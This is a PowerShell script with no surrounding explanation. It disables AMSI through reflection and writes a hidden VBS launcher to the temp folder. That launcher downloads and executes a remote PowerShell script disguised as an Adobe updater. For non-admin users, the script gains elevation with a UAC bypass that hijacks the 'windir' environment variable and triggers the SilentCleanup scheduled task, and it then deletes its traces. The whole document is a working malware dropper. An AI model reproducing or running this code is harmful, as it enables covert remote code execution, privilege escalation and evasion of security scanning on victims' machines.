[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) 

$VBS_file = @'
mycommand = "powershell -w hidden -ex bypass -c iex ((NeW-object net.wEbclient).downloadstring('https://raw.githubusercontent.com/burnitup545/AdobeUpdate/main/Updater.ps1'))"
CreateObject("Wscript.Shell").Run mycommand, 0, false
'@

Set-Content -Path $env:temp\co.vbs -Value $VBS_file

if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Payload goes here
    #It'll run as Administrator
    wscript $env:temp\co.vbs
} else {
    $registryPath = "HKCU:\Environment"
    $Name = "windir"
    
    
  
    Set-ItemProperty -Path $registryPath -Name $name -Value "wscript $env:temp\co.vbs  "
   
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Start-Sleep -s 5
    Remove-ItemProperty -Path $registryPath -Name $name
}
Start-Sleep -s 3
Remove-Item -Path $env:temp\co.vbs

Start-Sleep -s 7